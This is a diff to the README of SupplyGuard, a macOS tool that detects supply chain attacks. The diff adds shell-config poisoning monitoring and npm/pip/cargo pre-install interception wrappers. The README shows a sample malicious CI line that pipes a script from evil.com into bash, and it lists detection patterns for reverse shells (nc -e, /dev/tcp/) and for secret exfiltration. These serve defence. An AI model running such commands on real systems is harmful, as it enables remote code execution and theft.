@@ -13,6 +13,8 @@ Supply chain attacks target developers by injecting malicious code into trusted 
 - **Package Scripts**: Malicious `postinstall` scripts in `package.json` or `setup.py`
 - **Build Scripts**: Compromised `build.rs` or build scripts that execute during compilation
 - **CI/CD Backdoors**: Malicious GitHub Actions or GitLab CI configurations
+- **Shell Config Poisoning**: Malicious changes to `~/.zshrc`, `~/.bashrc`, and other shell config files
+- **Package Manager Interception**: Scan npm, pip, and cargo packages before install scripts run
 
 Traditional antivirus software misses these attacks because they don't understand developer workflows. SupplyGuard is specifically designed to detect these patterns.
 
@@ -23,6 +25,8 @@ Traditional antivirus software misses these attacks because they don't understan
 - **Lightweight**: 2-4MB binary, <40MB memory idle, <100MB scanning
 - **Offline Operation**: Fully local, no cloud API calls required
 - **Developer-Focused**: Understands VS Code, npm, Cargo, Python, Git workflows
+- **Shell Config Guard**: Monitors shell config files for poisoning; diffs against last known-good snapshot
+- **Pre-Install Scanning**: Optional wrappers for npm, pip, and cargo scan packages before install scripts run
 - **Native macOS Integration**: Uses launchd, native notifications, and macOS security features
 
 ## Installation
@@ -128,6 +132,16 @@ supplyguard status
 # Manually scan a directory
 supplyguard scan ~/Projects/my-repo
 
+# Scan a package before installing (used by intercept wrappers)
+supplyguard scan-package npm <package> [version]
+supplyguard scan-package pip <package> [version]
+supplyguard scan-package cargo <package> [version]
+
+# Package manager interception (wrap npm, pip, cargo to scan before install)
+supplyguard intercept enable   # Install wrappers to /usr/local/bin
+supplyguard intercept disable  # Remove wrappers
+supplyguard intercept status   # Show which managers are intercepted
+
 # List detected threats
 supplyguard threats --limit 20
 
@@ -213,13 +227,43 @@ Detects malicious GitHub Actions or GitLab CI configurations:
 - run: curl https://evil.com/backdoor.sh | bash  // ⚠️ CRITICAL
 ```
 
+### Shell Config Poisoning
+Monitors `~/.zshrc`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zprofile`, and `~/.config/fish/config.fish`. Diffs new content against a stored snapshot and flags:
+
+- **curl/wget piped to sh/bash**
+- **Base64 decode and execute**
+- **PATH prepending** with `/tmp`, hidden dirs, `/dev`, `/proc`
+- **Alias shadowing** of `git`, `npm`, `pip`, `cargo`, `ssh`, `sudo`, `docker`, `kubectl`
+- **Background process spawning** (`&`, `nohup`, `disown`) with suspicious commands
+- **Reverse shell patterns** (`nc -e`, `bash -i`, `/dev/tcp/`)
+- **Sensitive env var exfiltration** to remote endpoints
+
+Snapshots are stored in `~/.supplyguard/` and updated only when changes are clean or after you confirm.
+
+### Package Manager Interception
+When interception is enabled, wrappers in `/usr/local/bin` shadow `npm`, `pip`, and `cargo`. Before installs:
+
+1. The wrapper extracts package name and version.
+2. It runs `supplyguard scan-package <manager> <package> [version]`.
+3. **npm**: Fetches tarball, scans `package.json` scripts and `.js` files for malicious patterns.
+4. **pip**: Fetches sdist/wheel, scans `setup.py`, `pyproject.toml`, and `__init__.py`.
+5. **cargo**: Scans `build.rs` for network commands or writes to suspicious paths.
+6. If threats are found, the install is blocked and details are shown; you can confirm to proceed.
+7. If clean, the real package manager runs transparently.
+
+Use `supplyguard intercept enable` to install wrappers and prepend `/usr/local/bin` to PATH in your shell config. Use `supplyguard intercept disable` to remove them.
+
 ## Configuration
 
 Configuration is stored in `~/.supplyguard/config.toml`:
 
 ```toml
 [monitoring]
-watch_paths = ["~/Projects", "~/Downloads", "~/Developer"]
+watch_paths = [
+  "~/Projects", "~/Downloads", "~/Developer",
+  "~/.zshrc", "~/.bashrc", "~/.bash_profile", "~/.profile", "~/.zprofile",
+  "~/.config/fish/config.fish"
+]
 ignored_paths = ["node_modules", ".git/objects", "target", "dist"]
 scan_interval_ms = 100
 
@@ -261,7 +305,7 @@ path = "~/.supplyguard/threats.db"
     │         │
     │    ┌────┴─────┐
     │    │Detectors │
-    │    │(7 types) │
+    │    │(8 types) │
     │    └──────────┘
     │
 ┌───▼──────────────┐
@@ -274,7 +318,7 @@ path = "~/.supplyguard/threats.db"
 
 1. **FSEvents Watcher**: Monitors filesystem events using macOS FSEvents API
 2. **Scanner Engine**: Runs threat detection patterns against file contents
-3. **Detectors**: Specialized detectors for VS Code, Git, npm, Cargo, Python, CI/CD
+3. **Detectors**: Specialized detectors for VS Code, Git, npm, Cargo, Python, CI/CD, and shell config files
 4. **Database**: SQLite database for threat logging and scan cache
 5. **Notifier**: Native macOS notifications for detected threats
 6. **Worker Pool**: Parallel processing of file events
@@ -334,6 +378,8 @@ SupplyGuard detects:
 | Lightweight | ✅ | ❌ | ❌ | ❌ |
 | VS Code tasks | ✅ | ❌ | ❌ | ❌ |
 | Git hooks | ✅ | ❌ | ❌ | ❌ |
+| Shell config monitor | ✅ | ❌ | ❌ | ❌ |
+| Package manager interception | ✅ | ❌ | ❌ | ❌ |
 | Free & Open Source | ✅ | ❌ | ❌ | Mixed |
 
 ## FAQ
@@ -360,6 +406,10 @@ Open an issue on GitHub with:
 ### Can I run SupplyGuard on Linux or Windows?
 
 Currently macOS only. Linux support is planned. Windows support would require significant changes.
+
+### How does package manager interception work?
+
+Run `supplyguard intercept enable`. Wrapper scripts are installed to `/usr/local/bin` for `npm`, `pip`, and `cargo`. Your shell config is updated so `/usr/local/bin` is first in PATH. When you run `npm install <pkg>`, the wrapper calls `supplyguard scan-package npm <pkg>` first; if threats are found, the install is blocked unless you confirm. Use `supplyguard intercept disable` to remove the wrappers.
 
 ## Contributing
 
